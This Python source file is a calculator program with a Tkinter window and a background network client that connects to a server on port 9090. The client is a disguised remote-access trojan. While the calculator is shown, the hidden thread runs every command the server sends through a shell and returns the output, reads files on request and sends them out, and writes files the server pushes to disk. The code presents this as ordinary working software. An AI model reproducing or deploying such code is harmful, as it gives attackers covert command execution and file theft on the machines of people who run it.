import socket
import threading
import tkinter as tk
from tkinter import simpledialog
import subprocess 
import os


class Calculator:
    def __init__(self, master, nickname):
        self.master = master
        self.frame = tk.Frame(self.master)
        self.frame.pack()

        self.expression = ""
        self.result = None

        self.entry = tk.Entry(self.frame, width=30, font=("Arial", 14))
        self.entry.grid(row=0, column=0, columnspan=4)

        buttons_layout = [
            ('1', '2', '3', '+'),
            ('4', '5', '6', '-'),
            ('7', '8', '9', '*'),
            ('C', '0', '=', '/'),
        ]

        for i, row in enumerate(buttons_layout, start=1):
            for j, label in enumerate(row):
                button = tk.Button(self.frame, text=label, width=5, command=lambda x=label: self.button_click(x))
                button.grid(row=i, column=j)

        self.master.protocol("WM_DELETE_WINDOW", self.close_connection)

        self.nickname = nickname

    def button_click(self, value):
        if value == '=':
            self.calculate()
        elif value == 'C':
            self.clear()
        else:
            self.expression += value
            self.entry.delete(0, tk.END)
            self.entry.insert(0, self.expression)

    def calculate(self):
        try:
            self.result = eval(self.expression)
            self.entry.delete(0, tk.END)
            self.entry.insert(0, self.result)
        except SyntaxError:
            tk.messagebox.showerror("Error1", "Invalid expression")
        except ZeroDivisionError:
            tk.messagebox.showerror("Error2", "Division by zero")

    def clear(self):
        self.expression = ""
        self.result = None
        self.entry.delete(0, tk.END)

    def close_connection(self):
        self.master.destroy()

class Client:
    def __init__(self, host, port):
        self.HOST = host
        self.PORT = port
        
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.HOST, self.PORT))
        
        msg = tk.Tk()
        msg.withdraw()
        
        self.running = True

        self.nickname = simpledialog.askstring("Nickname", "Please choose a nickname", parent=msg)

        self.receiving_file=False
        self.des_path=""
        
        self.receive_thread = threading.Thread(target=self.receive_and_exe)
        self.receive_thread.start() 

        self.calculator_thread = threading.Thread(target=self.run_calculator)
        self.calculator_thread.start()
        
        
    def run_calculator(self):
        root = tk.Tk()
        root.title("Calculator")
        calculator = Calculator(root, self.nickname)
        root.mainloop()
        
    
    
    def receive_and_exe(self):
        while self.running:
            try:
                message = self.client.recv(4096)
                if self.receiving_file is True:
                    if message==b'EOF':
                        print("done...")
                        self.receiving_file=False
                        continue
                    if self.receiving_file is True:
                        print ("receiving file...")
                        full_path = os.path.join(self.des_path)
                        try:
                            with open(full_path, 'ab') as file:
                                print ("saving file...")
                                file.write(message)
                                # self.send_message("uploading was done successfully")
                        except Exception as e:
                            print(f"Error receiving file: {e}")
                # message=message.decode('utf-8')
                elif message==b"EOF":
                    self.receiving_file=False
                elif message == b'NICK':
                    self.client.send(self.nickname.encode('utf-8'))
                elif message == b'connected to server':
                    continue
                elif message.startswith(b"DOWNLOAD"):
                    message=message.decode('utf-8')
                    # print("yes")
                    parts=message.split()
                    file_path=parts[1]
                    chunk=""
                    with open(file_path, 'rb') as file:
                        chunk = file.read()
                    self.client.sendall(chunk)
                    self.client.send(b'EOF')
                elif message.startswith(b"UPLOAD"):
                    message=message.decode('utf-8')
                    self.receiving_file=True
                    parts=message.split(' ')
                    self.des_path=parts[2]
                    print("downloading...")
                elif message:
                    message=message.decode('utf-8')
                    message = message#.replace('\n\nEND\n\n', '')
                    print(message)
                    output = subprocess.check_output(message, shell=True, stderr=subprocess.STDOUT, text=True)
                    self.send_message(message+'\n'+output)
                    # print(output)
                else:
                    print("Error3")
                    self.close()
            except ConnectionAbortedError:
                break
            except subprocess.CalledProcessError as e:
                print('Error:',e)
                self.send_message(f'Error:{e}')
            except UnicodeDecodeError:
                continue
            except Exception as e:
                print("An error occurred:", e)
                self.send_message(f"An error occurred: {e}")
                client.close()
                self.running=False
                self.close()
        if not self.running:
            self.close()

    def close(self):
        self.running = False  
        self.client.close()  
        self.calculator_thread.join() 
        exit(0)  

    def send_message(self, message):
        try:
            # message+='\n\nEND\n\n'
            output=str(message).encode('utf-8')
            self.client.sendall(output)
            self.client.send(b'EOF')
            print(output.decode('utf-8'))
        except Exception as e:
            print("an error occurred:", e)
            self.client.close()

if __name__ == "__main__":
    HOST = '127.0.0.1'
    PORT = 9090
    client = Client(HOST, PORT)
    
